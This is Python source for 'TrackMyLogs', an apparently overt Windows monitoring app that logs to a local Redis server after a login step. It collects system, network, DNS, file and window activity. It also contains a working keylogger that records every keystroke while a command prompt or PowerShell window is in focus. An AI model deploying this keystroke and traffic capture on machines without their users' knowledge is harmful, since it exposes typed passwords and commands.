import threading
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from pynput import keyboard
import psutil
import time
import win32gui
import win32process
import wmi
from datetime import datetime
import platform
import tkinter as tk
from tkinter import messagebox
import requests
from scapy.all import AsyncSniffer, DNS, DNSQR
import pythoncom
import redis
from scapy.error import Scapy_Exception

# Global variables
word = ""
keylogger_running = False
stop_keylogger_flag = threading.Event()
auth_valid = False

redis_client = redis.StrictRedis(host='127.0.0.1', port=6379, db=0)

# Function to send logs to Redis
def send_log_to_redis(log_type, log_message):
    global token_entry_email
    user_email = token_entry_email.get()
    if not user_email:
        print("User email is not available.")
        return
    
    key = f"email:{user_email}"
    log_entry = f"{log_type}: {log_message} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    redis_client.rpush(key, log_entry)
    print("Log added to Redis for", user_email)

# System information
def system_information():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
    }

    send_log_to_redis('system_info', system_info)

def simple_wmi_query():
    try:
        pythoncom.CoInitialize() 
        c = wmi.WMI()
        for os in c.Win32_OperatingSystem():
            os_info = {
                "OS_name" : os.name
            }
            send_log_to_redis('OS Information', os_info)
    except Exception as e:
        os_info = {
            "OS_name": f"Error during WMI query: {e}"
        }
        send_log_to_redis('OS Information', os_info)

# Network Activity Logs
def network_activity_logs():
    while True:
        try:
            connections = psutil.net_connections()
            for conn in connections:
                if conn.status == 'ESTABLISHED':
                    network_activity_info = f"Local: {conn.laddr}, Remote: {conn.raddr}, Status: {conn.status}"
                    send_log_to_redis('Network Activity Information', network_activity_info)
            time.sleep(10)
        except Exception as e:
            send_log_to_redis('Network Error', f"Network monitoring error: {e}")
            time.sleep(30)

# Hardware and Resource Usage Logs
def hardware_usage_logs():
    while True:
        try:
            cpu_count = psutil.cpu_count()
            cpu_freq = psutil.cpu_freq()
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_usage = psutil.virtual_memory()
            hardware_usage_info = f"CPU Count: {cpu_count}, CPU Freq: {cpu_freq}, CPU Usage: {cpu_usage}%, Memory: {memory_usage}"
            send_log_to_redis('Hardware Usage Information', hardware_usage_info)
            time.sleep(5)
        except Exception as e:
            send_log_to_redis('Hardware Error', f"Hardware monitoring error: {e}")
            time.sleep(10)

# DNS Monitoring
def dns_monitor(packet):
    try:
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            query = packet[DNSQR].qname.decode('utf-8').rstrip('.')
            dns_monitor_info = f"DNS Query: {query}"
            send_log_to_redis('DNS Monitor Information', dns_monitor_info)
    except Exception as e:
        send_log_to_redis('DNS Error', f"DNS parsing error: {e}")

def start_dns_sniffing():
    while True:
        try:
            sniffer = AsyncSniffer(prn=dns_monitor, store=False)
            sniffer.start()
            while True:
                time.sleep(10)  # Keep the thread alive
        except Scapy_Exception as e:
            send_log_to_redis('DNS Error', f"Scapy error: {e}")
            time.sleep(30)
        except Exception as e:
            send_log_to_redis('DNS Error', f"Unexpected DNS error: {e}")
            time.sleep(30)

# File System Monitoring
def monitor_directory(path='.'):
    def on_event(event):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if event.event_type == 'modified':
            monitor_directory = f"File modified: {event.src_path}, Time: {now}"
        elif event.event_type == 'created':
            monitor_directory = f"File created: {event.src_path}, Time: {now}"
        elif event.event_type == 'deleted':
            monitor_directory = f"File deleted: {event.src_path}, Time: {now}"
        send_log_to_redis('Directory Monitoring Information', monitor_directory)

    event_handler = FileSystemEventHandler()
    event_handler.on_any_event = on_event

    observer = Observer()
    observer.schedule(event_handler, path=path, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Keylogger
def on_press(key):
    global word
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char is not None:
            key_pressed = f"Key pressed: {key.char}, Time: {now}"
            send_log_to_redis('Key Pressed', key_pressed)
            word += key.char if key != keyboard.Key.space else ' '
        elif key == keyboard.Key.space:
            send_log_to_redis('Word', word)
            word = ""
    except AttributeError:
        special_key = f"Special key pressed: {key}, Time: {now}"
        send_log_to_redis('Special Key', special_key)

def on_release(key):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_released = f"Key released: {key}, Time: {now}"
    send_log_to_redis('Key Released', key_released)
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_keylogger_flag.is_set():
            time.sleep(0.1)
        listener.stop()

# App Monitoring
def get_current_app_name():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return process.name(), win32gui.GetWindowText(hwnd)
    except Exception as e:
        return None, str(e)

def monitor_apps():
    global keylogger_running
    last_app = None

    while True:
        try:
            app_name, window_title = get_current_app_name()
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if app_name in ["cmd.exe", "powershell.exe"] and not keylogger_running:
                open_app = f"{app_name} opened. Starting keylogger. Time: {now}"
                send_log_to_redis('Open CMD or Powershell', open_app)
                keylogger_running = True
                stop_keylogger_flag.clear()
                threading.Thread(target=start_keylogger, daemon=True).start()
            elif app_name not in ["cmd.exe", "powershell.exe"] and keylogger_running:
                closed_app = f"{app_name} closed. Stopping keylogger. Time: {now}"
                send_log_to_redis('Close CMD or Powershell', closed_app)
                keylogger_running = False
                stop_keylogger_flag.set()

            if app_name != last_app:
                last_app = app_name
                current_app = f"App: '{window_title}' opened. Time: {now}"
                send_log_to_redis('Opened App', current_app)

            time.sleep(1)
        except Exception as e:
            send_log_to_redis('App Monitor Error', f"App monitoring error: {e}")
            time.sleep(5)

# Main Function
def start_background_tasks():
    threading.Thread(target=system_information, daemon=True).start()
    threading.Thread(target=simple_wmi_query, daemon=True).start()
    threading.Thread(target=monitor_apps, daemon=True).start()
    threading.Thread(target=network_activity_logs, daemon=True).start()
    threading.Thread(target=hardware_usage_logs, daemon=True).start()
    threading.Thread(target=monitor_directory, daemon=True).start()
    threading.Thread(target=start_dns_sniffing, daemon=True).start()

# GUI
def on_authenticate():
    global auth_valid
    email = token_entry_email.get()
    auth_token = token_entry_token.get()

    payload = {
        'email': email,
        'token': auth_token
    }

    try:
        response = requests.post('http://127.0.0.1:8000/api/submit-token/', json=payload)

        if response.status_code == 200:
            print("Token submitted successfully.")
            auth_valid = True
            auth_label.config(text="Authentication Successful!", fg="green")
            messagebox.showinfo("Success", "Logs generation has started! Please Don't close the Application.")
            root.after(100, start_background_tasks)
        else:
            print(f"Failed to submit token: {response.status_code}")
            print(f"Response content: {response.text}")
            auth_label.config(text="Authentication Failed!", fg="red")
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")
        auth_label.config(text="Error in submission", fg="red")

redis_client = redis.StrictRedis(host='localhost', port=6379, db=0)
shutdown_event = threading.Event()

def cleanup():
    global token_entry_email
    user_email = token_entry_email.get()

    if not user_email:
        print("No email provided for cleanup.")
        root.destroy()
        return
    
    url = 'http://127.0.0.1:8000/api/close-event/'  # Your local Django server
    payload = {
        'message': 'Application is closing',
        'app_id': 'my_app_001',
        'email' : user_email,
    }
    
    try:
        response = requests.post(url, json=payload)
        print("Server response:", response.json())
    except Exception as e:
        print("Failed to send close message:", str(e))

        shutdown_event.set()

    except Exception as e:
        print(f"Error during cleanup: {e}")

    root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    root.title("TrackMyLogs")
    root.geometry("400x300")

    # Header
    header_label = tk.Label(root, text="TrackMyLogs Authentication Portal", font=("Arial", 16, "bold"), fg="#333")
    header_label.pack(pady=10)

    # Email Entry
    tk.Label(root, text="Email:", font=("Arial", 12)).pack(pady=5, anchor="w", padx=20)
    token_entry_email = tk.Entry(root, width=40, font=("Arial", 10))
    token_entry_email.pack(pady=5)

    # Token Entry
    tk.Label(root, text="Authentication Token:", font=("Arial", 12)).pack(pady=5, anchor="w", padx=20)
    token_entry_token = tk.Entry(root, width=40, font=("Arial", 10))
    token_entry_token.pack(pady=5)

    # Authentication Status Label
    auth_label = tk.Label(root, text="", font=("Arial", 10))
    auth_label.pack(pady=5)

    # Submit Button
    submit_button = tk.Button(root, text="Submit", command=on_authenticate, font=("Arial", 12), bg="#4CAF50", fg="white")
    submit_button.pack(pady=15)

    # Bind cleanup function to window close event
    root.protocol("WM_DELETE_WINDOW", cleanup)

    # Start the Tkinter main loop
    root.mainloop()